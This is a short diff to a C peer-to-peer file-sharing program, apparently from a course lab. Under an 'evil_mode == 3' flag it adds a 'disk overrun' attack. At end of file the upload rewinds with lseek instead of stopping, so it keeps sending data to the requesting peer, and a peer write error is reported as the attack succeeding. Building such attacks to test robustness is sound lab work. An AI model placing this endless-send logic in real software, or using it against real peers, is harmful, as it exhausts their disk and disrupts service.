@@ -755,11 +755,19 @@ static void task_upload(task_t *t)
 	}
 
 	message("* Transferring file %s\n", t->filename);
+	
+	// Security Attack: overrun disk
+	if (evil_mode == 3)
+		message("* Attack with a disk overrun.\n");
+	
 	// Now, read file from disk and write it to the requesting peer.
 	while (1) {
 		int ret = write_from_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
-			error("* Peer write error");
+			if (evil_mode == 3)
+				message("* The disk overrun attack was successful, we have a peer write error.");
+			else
+				error("* Peer write error");
 			goto exit;
 		}
 
@@ -769,7 +777,10 @@ static void task_upload(task_t *t)
 			goto exit;
 		} else if (ret == TBUF_END && t->head == t->tail)
 			/* End of file */
-			break;
+			if (evil_mode == 3)
+				lseek(t->disk_fd, 0, 0); // continue writing by reset file pointer to beginning of file
+			else
+				break;
 	}
 
 	message("* Upload of %s complete\n", t->filename);
